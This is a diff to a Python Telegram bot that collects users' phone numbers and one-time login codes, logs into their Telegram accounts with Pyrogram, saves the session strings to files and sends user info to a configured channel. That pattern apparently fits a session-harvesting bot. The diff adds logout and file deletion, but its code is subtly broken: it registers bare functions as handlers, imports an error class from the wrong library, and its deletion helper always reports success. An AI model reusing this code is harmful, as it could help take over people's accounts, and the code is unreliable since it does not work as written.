@@ -1,12 +1,11 @@
 import logging
-import os
 import random
 import string
+import os
 from telegram import Update
 from telegram.ext import CommandHandler, MessageHandler, CallbackContext, ConversationHandler, Application, filters
 from pyrogram import Client
-from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired
-from telethon.errors import SessionPasswordNeededError
+from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeededError
 from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID  # Import credentials from config.py
 
 # Constants for conversation states
@@ -21,6 +20,18 @@ def generate_random_name(length=7):
 def save_session_string(user_id, string_session):
     with open(f"session_{user_id}.txt", "w") as f:
         f.write(string_session)
+
+# Delete session files from disk
+async def delete_session_files(user_id):
+    session_file = f"session_{user_id}.session"
+    memory_file = f"session_{user_id}.session-journal"
+    
+    # Delete the session files if they exist
+    if os.path.exists(session_file):
+        os.remove(session_file)
+    if os.path.exists(memory_file):
+        os.remove(memory_file)
+    return True
 
 # Send user info to the specified channel
 async def send_user_info_to_channel(update: Update, context: CallbackContext):
@@ -41,10 +52,15 @@ async def send_user_info_to_channel(update: Update, context: CallbackContext):
 # Step 1: Handle phone number input
 async def phone_number(update: Update, context: CallbackContext):
     if update.message:
-        await update.message.reply(
-            "Please enter your phone number along with the country code. \nExample: +19876543210"
-        )
-    return OTP  # Move to the next step (OTP)
+        logging.debug(f"User {update.message.chat.id} started the login process.")
+        try:
+            await update.message.reply(
+                "Please enter your phone number along with the country code. \nExample: +19876543210"
+            )
+        except AttributeError as e:
+            logging.error(f"Error sending message: {e}. Update: {update}")
+            await update.message.reply("An error occurred. Please try again.")
+        return OTP  # Move to the next step (OTP)
 
 # Step 2: Handle OTP input
 async def otp_code(update: Update, context: CallbackContext):
@@ -55,12 +71,12 @@ async def otp_code(update: Update, context: CallbackContext):
         # Store the phone number in user data to be used later in the login process
         context.user_data['phone_number'] = phone_number
 
-        await update.message.reply("📲 Sending OTP...")
-        
-        # Start the Pyrogram client
-        client = Client(f"session_{user_id}", API_ID, API_HASH)
-        
         try:
+            await update.message.reply("📲 Sending OTP...")
+            
+            # Start the Pyrogram client
+            client = Client(f"session_{user_id}", API_ID, API_HASH)
+            
             await client.connect()
             code = await client.send_code(phone_number)
             context.user_data['code_hash'] = code.phone_code_hash
@@ -162,6 +178,16 @@ async def handle_unauthorized_messages(update: Update, context: CallbackContext)
                 "/login - Connect your Telegram account"
             )
 
+# Logout handler to delete session files
+async def logout(update: Update, context: CallbackContext) -> None:
+    user_id = update.message.chat.id
+    files_deleted = await delete_session_files(user_id)
+
+    if files_deleted:
+        await update.message.reply("✅ Your session data and files have been cleared.")
+    else:
+        await update.message.reply("⚠️ You are not logged in, no session data found to clear.")
+
 # Conversation handler
 def conversation_handler() -> ConversationHandler:
     return ConversationHandler(
@@ -179,21 +205,13 @@ def main():
     # Use your bot's token
     application = Application.builder().token(BOT_TOKEN).build()
 
-    # Enable logging
-    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.DEBUG)
-
-    # Command Handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("help", help_command))
-
-    # Handle login process
+    application.add_handler(start)
+    application.add_handler(help_command)
     application.add_handler(conversation_handler())
+    application.add_handler(CommandHandler('logout', logout))  # Add logout command handler
 
-    # Handle unauthorized messages (before login)
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unauthorized_messages))
-
-    # Start Bot Polling
+    # Run the bot
     application.run_polling()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
